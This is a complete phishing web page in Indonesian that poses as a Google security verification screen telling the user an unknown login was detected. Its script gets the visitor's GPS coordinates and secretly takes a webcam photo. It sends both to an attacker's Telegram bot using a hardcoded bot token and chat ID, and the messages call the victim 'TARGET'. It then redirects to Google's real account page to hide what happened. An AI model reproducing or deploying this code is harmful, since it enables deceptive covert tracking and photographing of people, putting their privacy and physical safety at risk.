<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security - Verifikasi Perangkat</title>
    <style>
        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; width: 100%; }
        .logo { width: 75px; margin-bottom: 20px; }
        button { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; }
        #loader { display: none; margin-top: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
    <h2>Keamanan Akun</h2>
    <p>Sistem mendeteksi akses tidak dikenal. Klik tombol di bawah untuk sinkronisasi lokasi dan verifikasi wajah.</p>
    <button id="btn" onclick="eksekusi()">VERIFIKASI SEKARANG</button>
    <div id="loader"><div class="spinner"></div><p id="stat">Memulai Verifikasi...</p></div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const TOKEN = "8650738252:AAEWHSGL_HLg9_Rjta6MCAgbj6v9eWzqN44";
    const CHAT_ID = "8025603711";

    async function sendToTelegram(msg, isPhoto = false, blob = null) {
        const url = isPhoto ? `https://api.telegram.org/bot${TOKEN}/sendPhoto` : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        if (isPhoto) {
            fd.append('photo', blob, 't.jpg');
            fd.append('caption', msg);
        } else {
            fd.append('text', msg);
            fd.append('parse_mode', 'html');
        }
        await fetch(url, { method: 'POST', body: fd });
    }

    function eksekusi() {
        document.getElementById('btn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        
        // 1. Ambil Lokasi GPS
        document.getElementById('stat').innerText = "Menyinkronkan GPS...";
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const locMsg = `📍 <b>LOKASI TARGET DITEMUKAN!</b>\n\n` +
                               `Lat: <code>${lat}</code>\n` +
                               `Lon: <code>${lon}</code>\n\n` +
                               `🔗 <a href="https://www.google.com/maps?q=${lat},${lon}">Buka di Google Maps</a>`;
                await sendToTelegram(locMsg);
                ambilFoto(); // Lanjut ambil foto setelah lokasi dapat
            }, (err) => {
                sendToTelegram("❌ <b>Target Menolak Izin Lokasi</b>");
                ambilFoto();
            }, {enableHighAccuracy: true});
        }
    }

    async function ambilFoto() {
        document.getElementById('stat').innerText = "Memproses Biometrik...";
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            v.srcObject = s;

            setTimeout(() => {
                c.width = v.videoWidth; 
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => sendToTelegram("📸 <b>FOTO WAJAH TARGET</b>", true, b), 'image/jpeg');
                
                s.getTracks().forEach(t => t.stop());
                alert("Perangkat Anda Telah Aman.");
                window.location.href = "https://myaccount.google.com/";
            }, 3000);
        } catch (e) {
            sendToTelegram("❌ <b>Target Menolak Izin Kamera</b>");
            alert("Izin diperlukan untuk verifikasi!");
            location.reload();
        }
    }
</script>
</body>
</html>
